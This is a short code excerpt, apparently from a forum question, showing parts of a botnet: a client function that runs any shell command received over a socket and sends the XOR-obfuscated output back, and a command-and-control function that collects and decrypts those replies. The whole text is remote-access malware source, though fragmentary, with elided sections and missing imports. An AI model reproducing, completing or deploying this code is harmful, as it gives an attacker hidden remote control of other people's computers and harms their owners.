in client file

import subprocess

def shell_exec(cmd, sock):
	global stop
	if stop != True:
		try:
			DEVNULL = open(os.devnull, 'w')
			proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=DEVNULL, shell=True) 
			(output,_) = proc.communicate() 
			output = output.decode('utf-8')
			if output == '' or len(output) == 0:
				output = 'cmd executed without error => ' + cmd
			sock.send(xor_enc(output,key).encode())
		except:
			sock.send(xor_enc('Error: cmd exec',key).encode())
			

def handler(sock):
	...
				if command[0] == '!cmd':
					if attack != 0:
						stop = True
						attack = 0
					stop = False
					p= threading.Thread(target=shell_exec, args = (command[1], sock))
					p.start()
					attack+=1
	...
	
	

in cnc file

def SentCmd(data,sock,rlock):

...
		socketList.remove(sock)#del error connection
		dead += 1
	if('QBAJA' in data):
		print('You\'ve got mail:')
		try:
			sock.settimeout(1)
			msg = sock.recv(1024).decode()
			msg = xor_dec(msg,key)
			print(msg)
		except:
			print('failed')
	rlock.release()
...
